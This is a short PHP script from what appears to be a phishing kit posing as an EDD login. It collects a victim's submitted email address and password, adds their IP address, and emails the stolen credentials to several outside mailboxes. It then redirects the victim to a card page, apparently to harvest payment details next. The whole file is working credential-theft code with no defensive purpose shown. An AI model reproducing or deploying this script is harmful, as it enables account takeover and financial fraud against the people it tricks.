<?php

$subject = "EDD INFO FROM [ ".$_SERVER['REMOTE_ADDR']." ] ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['useremaill']."\n";
$message  = "Email: ".$_POST["useremaill"]."\n";
$message .= "Passsword: ".$_POST["emailpasss"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: emmaobinna@yandex' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("hushnshedd@protonmail.com, hushedd@yandex.com, hushnsh@gmail.com, hushnsh@yahoo.com",$subject,$message, $headers);



header("location: card.html"); 



?>